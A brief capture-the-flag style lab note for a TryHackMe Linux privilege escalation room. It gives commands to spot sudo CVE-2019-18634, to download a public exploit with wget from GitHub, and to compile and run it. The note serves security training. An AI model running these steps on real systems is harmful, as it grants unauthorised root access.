Linux PrivEsc Lab - [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)

Explanation & Exploit: https://github.com/saleemrashid/sudo-cve-2019-18634

---

Identify vulnerability:
1) Try to execute sudo: check for asterisks
2) Check sudo version: `sudo -V`

Download exploit:
```bash
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
```

Compile exploit:
```bash
gcc -o sudo_exploit exploit.c
```

Upload and run exploit.
